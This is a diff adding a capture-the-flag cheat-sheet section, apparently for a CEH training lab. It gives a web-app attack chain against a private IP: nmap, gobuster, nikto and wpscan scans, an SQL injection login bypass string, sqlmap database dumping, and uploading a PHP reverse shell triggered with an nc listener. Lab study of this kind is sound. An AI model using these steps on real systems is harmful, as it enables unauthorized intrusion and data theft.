@@ -9,6 +9,44 @@ just change ip and port in this code
 whatweb <url>
 whatweb http://www.abc.com
 ```
+####  flag.txt, example.com at IP
+```bash
+# Step 1 : Reconnaisance
+nmap -sC -sV -p- <ip>
+Focus on port 80/443 HTTP/HTTPS → since itʼs a web app.
+
+# Step 2: Enumerate web app
+Dirb or gobuster
+gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt
+
+Run Nikto for quick vulnerability scanning:
+nikto -h http://192.168.0.64
+
+ If itʼs WordPress → use `wpscan`
+wpscan --url http://192.168.0.64 --enumerate u,vt,tt
+
+# Step 3:  Check for Vulnerabilities
+SQL Injection (test login forms, URLs with `id=`)
+File upload vulnerabilities (try uploading reverse shell payload)
+Default credentials (admin\:admin, etc.)
+ If `training.cehorg.com` has a login panel → try SQL injection (' OR 1=1--)
+
+# Step 4 : Gain Acces
+ If SQLi works → dump tables with `sqlmap`:
+sqlmap -u "http://192.168.0.64/page.php?id=1" --dbs
+
+If file upload is possible → upload a PHP reverse shell.
+Example (PentestMonkey PHP reverse shell)
+Upload `shell.php`
+Start listener:
+nc -lvnp 4444
+Trigger `http://192.168.0.64/uploads/shell.php
+
+# Step 5: Privilege Escalation
+find / -name Flag.txt 2>/dev/null
+read the file
+
+```
 #### If website given and asks for flag.txt
 ```bash
 dirb http://training.cehorg.com -X .txt
